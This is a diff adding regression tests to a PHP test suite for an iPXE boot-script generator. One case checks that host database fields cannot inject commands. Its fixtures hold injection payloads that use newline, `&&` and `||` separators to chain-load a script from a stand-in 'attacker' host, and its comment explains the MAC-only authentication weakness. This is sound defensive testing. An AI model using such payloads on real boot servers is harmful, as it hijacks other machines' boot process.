@@ -603,6 +603,81 @@ $checks = [
             'ADPASSLEGACYSHOULDNOTAPPEAR',
         ],
     ],
+    /*
+     * generateIpxeItems() emits host and inventory columns as `set` lines,
+     * and service/inventory.php authenticates by MAC alone -- so anyone who
+     * knows a MAC can write those columns. iPXE separates commands on a
+     * newline and on `&&`/`||`, so an unsanitized value is an
+     * unauthenticated command injection into the boot script of someone
+     * else's machine, emitted above the menu where it runs before the user
+     * sees anything.
+     *
+     * Each refute is the SEPARATOR plus the command, not the command alone:
+     * once the separator is stripped the payload text survives harmlessly
+     * inside the value, so a marker-only refute would report a pass on
+     * output that still contained it. The matching expectLine pins that the
+     * field is still emitted, so dropping the value outright does not pass
+     * either.
+     */
+    'no host field can inject an iPXE command' => [
+        'scenario' => [
+            'host' => ['id' => 1, 'name' => 'testhost'],
+            'request' => ['arch' => 'x86_64', 'platform' => 'bios'],
+            'hostRow' => [
+                'imagename' => "keepme\nchain http://attacker/newline.ipxe",
+                'description2' => 'keepme && chain http://attacker/andand.ipxe',
+                'description3' => 'keepme || chain http://attacker/oror.ipxe',
+                'description4' => 'keepme ${boot-url}',
+            ],
+        ],
+        'expectLine' => [
+            'set imagename keepme',
+            'set description2 keepme',
+            'set description3 keepme',
+            'set description4 keepme',
+        ],
+        'refuteLine' => [
+            "\nchain http://attacker/newline.ipxe",
+            '&& chain http://attacker/andand.ipxe',
+            '|| chain http://attacker/oror.ipxe',
+            'set description4 keepme ${boot-url}',
+        ],
+    ],
+    /*
+     * A flag set to off has to reach iPXE as `set <field> 0`, not as
+     * nothing. iPXE conditionals are isset/iseq, so an omitted field and a
+     * field that is false read identically -- which is what stopped GH-572's
+     * "show this menu item only when the flag is set" case from working at
+     * all. Covered here rather than in the golden because the golden's host
+     * row carries no zero-valued column.
+     *
+     * The empty/null pair is asserted alongside deliberately: widening the
+     * falsy guard is only correct if it stops at absent, and a guard that
+     * emitted `set nothingset ` for an empty column would still satisfy the
+     * zero half on its own.
+     */
+    'a false flag is emitted as 0, an absent one not at all' => [
+        'scenario' => [
+            'host' => ['id' => 1, 'name' => 'testhost'],
+            'request' => ['arch' => 'x86_64', 'platform' => 'bios'],
+            'hostRow' => [
+                'enforce' => 0,
+                'pending' => '0',
+                'useAD' => false,
+                'nothingset' => '',
+                'nevermind' => null,
+            ],
+        ],
+        'expectLine' => [
+            "\nset enforce 0\n",
+            "\nset pending 0\n",
+            "\nset useAD 0\n",
+        ],
+        'refuteLine' => [
+            'set nothingset',
+            'set nevermind',
+        ],
+    ],
 ];
 
 $checkFailures = [];
